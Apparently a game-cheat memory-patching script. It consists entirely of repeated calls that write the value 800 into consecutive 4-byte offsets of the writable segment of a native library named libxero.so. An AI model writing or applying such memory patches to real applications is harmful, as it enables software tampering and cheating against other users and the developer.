Modify(Read('libxero.so','rw-p')+0xd734,800,4)
Modify(Read('libxero.so','rw-p')+0xd738,800,4)
Modify(Read('libxero.so','rw-p')+0xd73c,800,4)
Modify(Read('libxero.so','rw-p')+0xd740,800,4)
Modify(Read('libxero.so','rw-p')+0xd744,800,4)
Modify(Read('libxero.so','rw-p')+0xd748,800,4)
Modify(Read('libxero.so','rw-p')+0xd74c,800,4)
Modify(Read('libxero.so','rw-p')+0xd750,800,4)
Modify(Read('libxero.so','rw-p')+0xd754,800,4)
Modify(Read('libxero.so','rw-p')+0xd758,800,4)
Modify(Read('libxero.so','rw-p')+0xd75c,800,4)
Modify(Read('libxero.so','rw-p')+0xd760,800,4)
Modify(Read('libxero.so','rw-p')+0xd764,800,4)
Modify(Read('libxero.so','rw-p')+0xd768,800,4)
Modify(Read('libxero.so','rw-p')+0xd76c,800,4)
Modify(Read('libxero.so','rw-p')+0xd770,800,4)
Modify(Read('libxero.so','rw-p')+0xd774,800,4)
Modify(Read('libxero.so','rw-p')+0xd778,800,4)
Modify(Read('libxero.so','rw-p')+0xd77c,800,4)
Modify(Read('libxero.so','rw-p')+0xd780,800,4)
Modify(Read('libxero.so','rw-p')+0xd784,800,4)
Modify(Read('libxero.so','rw-p')+0xd788,800,4)
Modify(Read('libxero.so','rw-p')+0xd78c,800,4)
Modify(Read('libxero.so','rw-p')+0xd790,800,4)
Modify(Read('libxero.so','rw-p')+0xd794,800,4)
Modify(Read('libxero.so','rw-p')+0xd798,800,4)
Modify(Read('libxero.so','rw-p')+0xd79c,800,4)
Modify(Read('libxero.so','rw-p')+0xd7a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd7a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd7a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd7ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd7b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd7b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd7b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd7bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd7c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd7c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd7c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd7cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd7d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd7d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd7d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd7dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd7e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd7e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd7e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd7ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd7f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd7f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd7f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd7fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd800,800,4)
Modify(Read('libxero.so','rw-p')+0xd804,800,4)
Modify(Read('libxero.so','rw-p')+0xd808,800,4)
Modify(Read('libxero.so','rw-p')+0xd80c,800,4)
Modify(Read('libxero.so','rw-p')+0xd810,800,4)
Modify(Read('libxero.so','rw-p')+0xd814,800,4)
Modify(Read('libxero.so','rw-p')+0xd818,800,4)
Modify(Read('libxero.so','rw-p')+0xd81c,800,4)
Modify(Read('libxero.so','rw-p')+0xd820,800,4)
Modify(Read('libxero.so','rw-p')+0xd824,800,4)
Modify(Read('libxero.so','rw-p')+0xd828,800,4)
Modify(Read('libxero.so','rw-p')+0xd82c,800,4)
Modify(Read('libxero.so','rw-p')+0xd830,800,4)
Modify(Read('libxero.so','rw-p')+0xd834,800,4)
Modify(Read('libxero.so','rw-p')+0xd838,800,4)
Modify(Read('libxero.so','rw-p')+0xd83c,800,4)
Modify(Read('libxero.so','rw-p')+0xd840,800,4)
Modify(Read('libxero.so','rw-p')+0xd844,800,4)
Modify(Read('libxero.so','rw-p')+0xd848,800,4)
Modify(Read('libxero.so','rw-p')+0xd84c,800,4)
Modify(Read('libxero.so','rw-p')+0xd850,800,4)
Modify(Read('libxero.so','rw-p')+0xd854,800,4)
Modify(Read('libxero.so','rw-p')+0xd858,800,4)
Modify(Read('libxero.so','rw-p')+0xd85c,800,4)
Modify(Read('libxero.so','rw-p')+0xd860,800,4)
Modify(Read('libxero.so','rw-p')+0xd864,800,4)
Modify(Read('libxero.so','rw-p')+0xd868,800,4)
Modify(Read('libxero.so','rw-p')+0xd86c,800,4)
Modify(Read('libxero.so','rw-p')+0xd870,800,4)
Modify(Read('libxero.so','rw-p')+0xd874,800,4)
Modify(Read('libxero.so','rw-p')+0xd878,800,4)
Modify(Read('libxero.so','rw-p')+0xd87c,800,4)
Modify(Read('libxero.so','rw-p')+0xd880,800,4)
Modify(Read('libxero.so','rw-p')+0xd884,800,4)
Modify(Read('libxero.so','rw-p')+0xd888,800,4)
Modify(Read('libxero.so','rw-p')+0xd88c,800,4)
Modify(Read('libxero.so','rw-p')+0xd890,800,4)
Modify(Read('libxero.so','rw-p')+0xd894,800,4)
Modify(Read('libxero.so','rw-p')+0xd898,800,4)
Modify(Read('libxero.so','rw-p')+0xd89c,800,4)
Modify(Read('libxero.so','rw-p')+0xd8a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd8a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd8a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd8ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd8b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd8b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd8b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd8bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd8c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd8c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd8c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd8cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd8d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd8d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd8d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd8dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd8e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd8e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd8e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd8ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd8f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd8f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd8f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd8fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd900,800,4)
Modify(Read('libxero.so','rw-p')+0xd904,800,4)
Modify(Read('libxero.so','rw-p')+0xd908,800,4)
Modify(Read('libxero.so','rw-p')+0xd90c,800,4)
Modify(Read('libxero.so','rw-p')+0xd910,800,4)
Modify(Read('libxero.so','rw-p')+0xd914,800,4)
Modify(Read('libxero.so','rw-p')+0xd918,800,4)
Modify(Read('libxero.so','rw-p')+0xd91c,800,4)
Modify(Read('libxero.so','rw-p')+0xd920,800,4)
Modify(Read('libxero.so','rw-p')+0xd924,800,4)
Modify(Read('libxero.so','rw-p')+0xd928,800,4)
Modify(Read('libxero.so','rw-p')+0xd92c,800,4)
Modify(Read('libxero.so','rw-p')+0xd930,800,4)
Modify(Read('libxero.so','rw-p')+0xd934,800,4)
Modify(Read('libxero.so','rw-p')+0xd938,800,4)
Modify(Read('libxero.so','rw-p')+0xd93c,800,4)
Modify(Read('libxero.so','rw-p')+0xd940,800,4)
Modify(Read('libxero.so','rw-p')+0xd944,800,4)
Modify(Read('libxero.so','rw-p')+0xd948,800,4)
Modify(Read('libxero.so','rw-p')+0xd94c,800,4)
Modify(Read('libxero.so','rw-p')+0xd950,800,4)
Modify(Read('libxero.so','rw-p')+0xd954,800,4)
Modify(Read('libxero.so','rw-p')+0xd958,800,4)
Modify(Read('libxero.so','rw-p')+0xd95c,800,4)
Modify(Read('libxero.so','rw-p')+0xd960,800,4)
Modify(Read('libxero.so','rw-p')+0xd964,800,4)
Modify(Read('libxero.so','rw-p')+0xd968,800,4)
Modify(Read('libxero.so','rw-p')+0xd96c,800,4)
Modify(Read('libxero.so','rw-p')+0xd970,800,4)
Modify(Read('libxero.so','rw-p')+0xd974,800,4)
Modify(Read('libxero.so','rw-p')+0xd978,800,4)
Modify(Read('libxero.so','rw-p')+0xd97c,800,4)
Modify(Read('libxero.so','rw-p')+0xd980,800,4)
Modify(Read('libxero.so','rw-p')+0xd984,800,4)
Modify(Read('libxero.so','rw-p')+0xd988,800,4)
Modify(Read('libxero.so','rw-p')+0xd98c,800,4)
Modify(Read('libxero.so','rw-p')+0xd990,800,4)
Modify(Read('libxero.so','rw-p')+0xd994,800,4)
Modify(Read('libxero.so','rw-p')+0xd998,800,4)
Modify(Read('libxero.so','rw-p')+0xd99c,800,4)
Modify(Read('libxero.so','rw-p')+0xd9a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd9a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd9a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd9ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd9b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd9b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd9b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd9bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd9c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd9c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd9c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd9cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd9d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd9d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd9d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd9dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd9e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd9e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd9e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd9ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd9f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd9f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd9f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd9fc,800,4)
Modify(Read('libxero.so','rw-p')+0xda00,800,4)
Modify(Read('libxero.so','rw-p')+0xda04,800,4)
Modify(Read('libxero.so','rw-p')+0xda08,800,4)
Modify(Read('libxero.so','rw-p')+0xda0c,800,4)
Modify(Read('libxero.so','rw-p')+0xda10,800,4)
Modify(Read('libxero.so','rw-p')+0xda14,800,4)
Modify(Read('libxero.so','rw-p')+0xda18,800,4)
Modify(Read('libxero.so','rw-p')+0xda1c,800,4)
Modify(Read('libxero.so','rw-p')+0xda20,800,4)
Modify(Read('libxero.so','rw-p')+0xda24,800,4)
Modify(Read('libxero.so','rw-p')+0xda28,800,4)
Modify(Read('libxero.so','rw-p')+0xda2c,800,4)
Modify(Read('libxero.so','rw-p')+0xda30,800,4)
Modify(Read('libxero.so','rw-p')+0xda34,800,4)
Modify(Read('libxero.so','rw-p')+0xda38,800,4)
Modify(Read('libxero.so','rw-p')+0xda3c,800,4)
Modify(Read('libxero.so','rw-p')+0xda40,800,4)
Modify(Read('libxero.so','rw-p')+0xda44,800,4)
Modify(Read('libxero.so','rw-p')+0xda48,800,4)
Modify(Read('libxero.so','rw-p')+0xda4c,800,4)
Modify(Read('libxero.so','rw-p')+0xda50,800,4)
Modify(Read('libxero.so','rw-p')+0xda54,800,4)
Modify(Read('libxero.so','rw-p')+0xda58,800,4)
Modify(Read('libxero.so','rw-p')+0xda5c,800,4)
Modify(Read('libxero.so','rw-p')+0xda60,800,4)
Modify(Read('libxero.so','rw-p')+0xda64,800,4)
Modify(Read('libxero.so','rw-p')+0xda68,800,4)
Modify(Read('libxero.so','rw-p')+0xda6c,800,4)
Modify(Read('libxero.so','rw-p')+0xda70,800,4)
Modify(Read('libxero.so','rw-p')+0xda74,800,4)
Modify(Read('libxero.so','rw-p')+0xda78,800,4)
Modify(Read('libxero.so','rw-p')+0xda7c,800,4)
Modify(Read('libxero.so','rw-p')+0xda80,800,4)
Modify(Read('libxero.so','rw-p')+0xda84,800,4)
Modify(Read('libxero.so','rw-p')+0xda88,800,4)
Modify(Read('libxero.so','rw-p')+0xda8c,800,4)
Modify(Read('libxero.so','rw-p')+0xda90,800,4)
Modify(Read('libxero.so','rw-p')+0xda94,800,4)
Modify(Read('libxero.so','rw-p')+0xda98,800,4)
Modify(Read('libxero.so','rw-p')+0xda9c,800,4)
Modify(Read('libxero.so','rw-p')+0xdaa0,800,4)
Modify(Read('libxero.so','rw-p')+0xdaa4,800,4)
Modify(Read('libxero.so','rw-p')+0xdaa8,800,4)
Modify(Read('libxero.so','rw-p')+0xdaac,800,4)
Modify(Read('libxero.so','rw-p')+0xdab0,800,4)
Modify(Read('libxero.so','rw-p')+0xdab4,800,4)
Modify(Read('libxero.so','rw-p')+0xdab8,800,4)
Modify(Read('libxero.so','rw-p')+0xdabc,800,4)
Modify(Read('libxero.so','rw-p')+0xdac0,800,4)
Modify(Read('libxero.so','rw-p')+0xdac4,800,4)
Modify(Read('libxero.so','rw-p')+0xdac8,800,4)
Modify(Read('libxero.so','rw-p')+0xdacc,800,4)
Modify(Read('libxero.so','rw-p')+0xdad0,800,4)
Modify(Read('libxero.so','rw-p')+0xdad4,800,4)
Modify(Read('libxero.so','rw-p')+0xdad8,800,4)
Modify(Read('libxero.so','rw-p')+0xdadc,800,4)
Modify(Read('libxero.so','rw-p')+0xdae0,800,4)
Modify(Read('libxero.so','rw-p')+0xdae4,800,4)
Modify(Read('libxero.so','rw-p')+0xdae8,800,4)
Modify(Read('libxero.so','rw-p')+0xdaec,800,4)
Modify(Read('libxero.so','rw-p')+0xdaf0,800,4)
Modify(Read('libxero.so','rw-p')+0xdaf4,800,4)
Modify(Read('libxero.so','rw-p')+0xdaf8,800,4)
Modify(Read('libxero.so','rw-p')+0xdafc,800,4)
Modify(Read('libxero.so','rw-p')+0xdb00,800,4)
Modify(Read('libxero.so','rw-p')+0xdb04,800,4)
Modify(Read('libxero.so','rw-p')+0xdb08,800,4)
Modify(Read('libxero.so','rw-p')+0xdb0c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb10,800,4)
Modify(Read('libxero.so','rw-p')+0xdb14,800,4)
Modify(Read('libxero.so','rw-p')+0xdb18,800,4)
Modify(Read('libxero.so','rw-p')+0xdb1c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb20,800,4)
Modify(Read('libxero.so','rw-p')+0xdb24,800,4)
Modify(Read('libxero.so','rw-p')+0xdb28,800,4)
Modify(Read('libxero.so','rw-p')+0xdb2c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb30,800,4)
Modify(Read('libxero.so','rw-p')+0xdb34,800,4)
Modify(Read('libxero.so','rw-p')+0xdb38,800,4)
Modify(Read('libxero.so','rw-p')+0xdb3c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb40,800,4)
Modify(Read('libxero.so','rw-p')+0xdb44,800,4)
Modify(Read('libxero.so','rw-p')+0xdb48,800,4)
Modify(Read('libxero.so','rw-p')+0xdb4c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb50,800,4)
Modify(Read('libxero.so','rw-p')+0xdb54,800,4)
Modify(Read('libxero.so','rw-p')+0xdb58,800,4)
Modify(Read('libxero.so','rw-p')+0xdb5c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb60,800,4)
Modify(Read('libxero.so','rw-p')+0xdb64,800,4)
Modify(Read('libxero.so','rw-p')+0xdb68,800,4)
Modify(Read('libxero.so','rw-p')+0xdb6c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb70,800,4)
Modify(Read('libxero.so','rw-p')+0xdb74,800,4)
Modify(Read('libxero.so','rw-p')+0xdb78,800,4)
Modify(Read('libxero.so','rw-p')+0xdb7c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb80,800,4)
Modify(Read('libxero.so','rw-p')+0xdb84,800,4)
Modify(Read('libxero.so','rw-p')+0xdb88,800,4)
Modify(Read('libxero.so','rw-p')+0xdb8c,800,4)
Modify(Read('libxero.so','rw-p')+0xdb90,800,4)
Modify(Read('libxero.so','rw-p')+0xdb94,800,4)
Modify(Read('libxero.so','rw-p')+0xdb98,800,4)
Modify(Read('libxero.so','rw-p')+0xdb9c,800,4)
Modify(Read('libxero.so','rw-p')+0xdba0,800,4)
Modify(Read('libxero.so','rw-p')+0xdba4,800,4)
Modify(Read('libxero.so','rw-p')+0xdba8,800,4)
Modify(Read('libxero.so','rw-p')+0xdbac,800,4)
Modify(Read('libxero.so','rw-p')+0xdbb0,800,4)
Modify(Read('libxero.so','rw-p')+0xdbb4,800,4)
Modify(Read('libxero.so','rw-p')+0xdbb8,800,4)
Modify(Read('libxero.so','rw-p')+0xdbbc,800,4)
Modify(Read('libxero.so','rw-p')+0xdbc0,800,4)
Modify(Read('libxero.so','rw-p')+0xdbc4,800,4)
Modify(Read('libxero.so','rw-p')+0xdbc8,800,4)
Modify(Read('libxero.so','rw-p')+0xdbcc,800,4)
Modify(Read('libxero.so','rw-p')+0xdbd0,800,4)
Modify(Read('libxero.so','rw-p')+0xdbd4,800,4)
Modify(Read('libxero.so','rw-p')+0xdbd8,800,4)
Modify(Read('libxero.so','rw-p')+0xdbdc,800,4)
Modify(Read('libxero.so','rw-p')+0xdbe0,800,4)
Modify(Read('libxero.so','rw-p')+0xdbe4,800,4)
Modify(Read('libxero.so','rw-p')+0xdbe8,800,4)
Modify(Read('libxero.so','rw-p')+0xdbec,800,4)
Modify(Read('libxero.so','rw-p')+0xdbf0,800,4)
Modify(Read('libxero.so','rw-p')+0xdbf4,800,4)
Modify(Read('libxero.so','rw-p')+0xdbf8,800,4)
Modify(Read('libxero.so','rw-p')+0xdbfc,800,4)
Modify(Read('libxero.so','rw-p')+0xdc00,800,4)
Modify(Read('libxero.so','rw-p')+0xdc04,800,4)
Modify(Read('libxero.so','rw-p')+0xdc08,800,4)
Modify(Read('libxero.so','rw-p')+0xdc0c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc10,800,4)
Modify(Read('libxero.so','rw-p')+0xdc14,800,4)
Modify(Read('libxero.so','rw-p')+0xdc18,800,4)
Modify(Read('libxero.so','rw-p')+0xdc1c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc20,800,4)
Modify(Read('libxero.so','rw-p')+0xdc24,800,4)
Modify(Read('libxero.so','rw-p')+0xdc28,800,4)
Modify(Read('libxero.so','rw-p')+0xdc2c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc30,800,4)
Modify(Read('libxero.so','rw-p')+0xdc34,800,4)
Modify(Read('libxero.so','rw-p')+0xdc38,800,4)
Modify(Read('libxero.so','rw-p')+0xdc3c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc40,800,4)
Modify(Read('libxero.so','rw-p')+0xdc44,800,4)
Modify(Read('libxero.so','rw-p')+0xdc48,800,4)
Modify(Read('libxero.so','rw-p')+0xdc4c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc50,800,4)
Modify(Read('libxero.so','rw-p')+0xdc54,800,4)
Modify(Read('libxero.so','rw-p')+0xdc58,800,4)
Modify(Read('libxero.so','rw-p')+0xdc5c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc60,800,4)
Modify(Read('libxero.so','rw-p')+0xdc64,800,4)
Modify(Read('libxero.so','rw-p')+0xdc68,800,4)
Modify(Read('libxero.so','rw-p')+0xdc6c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc70,800,4)
Modify(Read('libxero.so','rw-p')+0xdc74,800,4)
Modify(Read('libxero.so','rw-p')+0xdc78,800,4)
Modify(Read('libxero.so','rw-p')+0xdc7c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc80,800,4)
Modify(Read('libxero.so','rw-p')+0xdc84,800,4)
Modify(Read('libxero.so','rw-p')+0xdc88,800,4)
Modify(Read('libxero.so','rw-p')+0xdc8c,800,4)
Modify(Read('libxero.so','rw-p')+0xdc90,800,4)
Modify(Read('libxero.so','rw-p')+0xdc94,800,4)
Modify(Read('libxero.so','rw-p')+0xdc98,800,4)
Modify(Read('libxero.so','rw-p')+0xdc9c,800,4)
Modify(Read('libxero.so','rw-p')+0xdca0,800,4)
Modify(Read('libxero.so','rw-p')+0xdca4,800,4)
Modify(Read('libxero.so','rw-p')+0xdca8,800,4)
Modify(Read('libxero.so','rw-p')+0xdcac,800,4)
Modify(Read('libxero.so','rw-p')+0xdcb0,800,4)
Modify(Read('libxero.so','rw-p')+0xdcb4,800,4)
Modify(Read('libxero.so','rw-p')+0xdcb8,800,4)
Modify(Read('libxero.so','rw-p')+0xdcbc,800,4)
Modify(Read('libxero.so','rw-p')+0xdcc0,800,4)
Modify(Read('libxero.so','rw-p')+0xdcc4,800,4)
Modify(Read('libxero.so','rw-p')+0xdcc8,800,4)
Modify(Read('libxero.so','rw-p')+0xdccc,800,4)
Modify(Read('libxero.so','rw-p')+0xdcd0,800,4)
Modify(Read('libxero.so','rw-p')+0xdcd4,800,4)
Modify(Read('libxero.so','rw-p')+0xdcd8,800,4)
Modify(Read('libxero.so','rw-p')+0xdcdc,800,4)
Modify(Read('libxero.so','rw-p')+0xdce0,800,4)
Modify(Read('libxero.so','rw-p')+0xdce4,800,4)
Modify(Read('libxero.so','rw-p')+0xdce8,800,4)
Modify(Read('libxero.so','rw-p')+0xdcec,800,4)
Modify(Read('libxero.so','rw-p')+0xdcf0,800,4)
Modify(Read('libxero.so','rw-p')+0xdcf4,800,4)
Modify(Read('libxero.so','rw-p')+0xdcf8,800,4)
Modify(Read('libxero.so','rw-p')+0xdcfc,800,4)
Modify(Read('libxero.so','rw-p')+0xdd00,800,4)
Modify(Read('libxero.so','rw-p')+0xdd04,800,4)
Modify(Read('libxero.so','rw-p')+0xdd08,800,4)
Modify(Read('libxero.so','rw-p')+0xdd0c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd10,800,4)
Modify(Read('libxero.so','rw-p')+0xdd14,800,4)
Modify(Read('libxero.so','rw-p')+0xdd18,800,4)
Modify(Read('libxero.so','rw-p')+0xdd1c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd20,800,4)
Modify(Read('libxero.so','rw-p')+0xdd24,800,4)
Modify(Read('libxero.so','rw-p')+0xdd28,800,4)
Modify(Read('libxero.so','rw-p')+0xdd2c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd30,800,4)
Modify(Read('libxero.so','rw-p')+0xdd34,800,4)
Modify(Read('libxero.so','rw-p')+0xdd38,800,4)
Modify(Read('libxero.so','rw-p')+0xdd3c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd40,800,4)
Modify(Read('libxero.so','rw-p')+0xdd44,800,4)
Modify(Read('libxero.so','rw-p')+0xdd48,800,4)
Modify(Read('libxero.so','rw-p')+0xdd4c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd50,800,4)
Modify(Read('libxero.so','rw-p')+0xdd54,800,4)
Modify(Read('libxero.so','rw-p')+0xdd58,800,4)
Modify(Read('libxero.so','rw-p')+0xdd5c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd60,800,4)
Modify(Read('libxero.so','rw-p')+0xdd64,800,4)
Modify(Read('libxero.so','rw-p')+0xdd68,800,4)
Modify(Read('libxero.so','rw-p')+0xdd6c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd70,800,4)
Modify(Read('libxero.so','rw-p')+0xdd74,800,4)
Modify(Read('libxero.so','rw-p')+0xdd78,800,4)
Modify(Read('libxero.so','rw-p')+0xdd7c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd80,800,4)
Modify(Read('libxero.so','rw-p')+0xdd84,800,4)
Modify(Read('libxero.so','rw-p')+0xdd88,800,4)
Modify(Read('libxero.so','rw-p')+0xdd8c,800,4)
Modify(Read('libxero.so','rw-p')+0xdd90,800,4)
Modify(Read('libxero.so','rw-p')+0xdd94,800,4)
Modify(Read('libxero.so','rw-p')+0xdd98,800,4)
Modify(Read('libxero.so','rw-p')+0xdd9c,800,4)
Modify(Read('libxero.so','rw-p')+0xdda0,800,4)
Modify(Read('libxero.so','rw-p')+0xdda4,800,4)
Modify(Read('libxero.so','rw-p')+0xdda8,800,4)
Modify(Read('libxero.so','rw-p')+0xddac,800,4)
Modify(Read('libxero.so','rw-p')+0xddb0,800,4)
Modify(Read('libxero.so','rw-p')+0xddb4,800,4)
Modify(Read('libxero.so','rw-p')+0xddb8,800,4)
Modify(Read('libxero.so','rw-p')+0xddbc,800,4)
Modify(Read('libxero.so','rw-p')+0xddc0,800,4)
Modify(Read('libxero.so','rw-p')+0xddc4,800,4)
Modify(Read('libxero.so','rw-p')+0xddc8,800,4)
Modify(Read('libxero.so','rw-p')+0xddcc,800,4)
Modify(Read('libxero.so','rw-p')+0xddd0,800,4)
Modify(Read('libxero.so','rw-p')+0xddd4,800,4)
Modify(Read('libxero.so','rw-p')+0xddd8,800,4)
Modify(Read('libxero.so','rw-p')+0xdddc,800,4)
Modify(Read('libxero.so','rw-p')+0xdde0,800,4)
Modify(Read('libxero.so','rw-p')+0xdde4,800,4)
Modify(Read('libxero.so','rw-p')+0xdde8,800,4)
Modify(Read('libxero.so','rw-p')+0xddec,800,4)
Modify(Read('libxero.so','rw-p')+0xddf0,800,4)
Modify(Read('libxero.so','rw-p')+0xddf4,800,4)
Modify(Read('libxero.so','rw-p')+0xddf8,800,4)
Modify(Read('libxero.so','rw-p')+0xddfc,800,4)
Modify(Read('libxero.so','rw-p')+0xde00,800,4)
Modify(Read('libxero.so','rw-p')+0xde04,800,4)
Modify(Read('libxero.so','rw-p')+0xde08,800,4)
Modify(Read('libxero.so','rw-p')+0xde0c,800,4)
Modify(Read('libxero.so','rw-p')+0xde10,800,4)
Modify(Read('libxero.so','rw-p')+0xde14,800,4)
Modify(Read('libxero.so','rw-p')+0xde18,800,4)
Modify(Read('libxero.so','rw-p')+0xde1c,800,4)
Modify(Read('libxero.so','rw-p')+0xde20,800,4)
Modify(Read('libxero.so','rw-p')+0xde24,800,4)
Modify(Read('libxero.so','rw-p')+0xde28,800,4)
Modify(Read('libxero.so','rw-p')+0xde2c,800,4)
Modify(Read('libxero.so','rw-p')+0xde30,800,4)
Modify(Read('libxero.so','rw-p')+0xde34,800,4)
Modify(Read('libxero.so','rw-p')+0xde38,800,4)
Modify(Read('libxero.so','rw-p')+0xde3c,800,4)
Modify(Read('libxero.so','rw-p')+0xde40,800,4)
Modify(Read('libxero.so','rw-p')+0xde44,800,4)
Modify(Read('libxero.so','rw-p')+0xde48,800,4)
Modify(Read('libxero.so','rw-p')+0xde4c,800,4)
Modify(Read('libxero.so','rw-p')+0xde50,800,4)
Modify(Read('libxero.so','rw-p')+0xde54,800,4)
Modify(Read('libxero.so','rw-p')+0xde58,800,4)
Modify(Read('libxero.so','rw-p')+0xde5c,800,4)
Modify(Read('libxero.so','rw-p')+0xde60,800,4)
Modify(Read('libxero.so','rw-p')+0xde64,800,4)
Modify(Read('libxero.so','rw-p')+0xde68,800,4)
Modify(Read('libxero.so','rw-p')+0xde6c,800,4)
Modify(Read('libxero.so','rw-p')+0xde70,800,4)
Modify(Read('libxero.so','rw-p')+0xde74,800,4)
Modify(Read('libxero.so','rw-p')+0xde78,800,4)
Modify(Read('libxero.so','rw-p')+0xde7c,800,4)
Modify(Read('libxero.so','rw-p')+0xde80,800,4)
Modify(Read('libxero.so','rw-p')+0xde84,800,4)
Modify(Read('libxero.so','rw-p')+0xde88,800,4)
Modify(Read('libxero.so','rw-p')+0xde8c,800,4)
Modify(Read('libxero.so','rw-p')+0xde90,800,4)
Modify(Read('libxero.so','rw-p')+0xde94,800,4)
Modify(Read('libxero.so','rw-p')+0xde98,800,4)
Modify(Read('libxero.so','rw-p')+0xde9c,800,4)
Modify(Read('libxero.so','rw-p')+0xdea0,800,4)
Modify(Read('libxero.so','rw-p')+0xdea4,800,4)
Modify(Read('libxero.so','rw-p')+0xdea8,800,4)
Modify(Read('libxero.so','rw-p')+0xdeac,800,4)
Modify(Read('libxero.so','rw-p')+0xdeb0,800,4)
Modify(Read('libxero.so','rw-p')+0xdeb4,800,4)
Modify(Read('libxero.so','rw-p')+0xdeb8,800,4)
Modify(Read('libxero.so','rw-p')+0xdebc,800,4)
Modify(Read('libxero.so','rw-p')+0xdec0,800,4)
Modify(Read('libxero.so','rw-p')+0xdec4,800,4)
Modify(Read('libxero.so','rw-p')+0xdec8,800,4)
Modify(Read('libxero.so','rw-p')+0xdecc,800,4)
Modify(Read('libxero.so','rw-p')+0xded0,800,4)
Modify(Read('libxero.so','rw-p')+0xded4,800,4)
Modify(Read('libxero.so','rw-p')+0xded8,800,4)
Modify(Read('libxero.so','rw-p')+0xdedc,800,4)
Modify(Read('libxero.so','rw-p')+0xdee0,800,4)
Modify(Read('libxero.so','rw-p')+0xdee4,800,4)
Modify(Read('libxero.so','rw-p')+0xdee8,800,4)
Modify(Read('libxero.so','rw-p')+0xdeec,800,4)
Modify(Read('libxero.so','rw-p')+0xdef0,800,4)
Modify(Read('libxero.so','rw-p')+0xdef4,800,4)
Modify(Read('libxero.so','rw-p')+0xdef8,800,4)
Modify(Read('libxero.so','rw-p')+0xdefc,800,4)
Modify(Read('libxero.so','rw-p')+0xdf00,800,4)
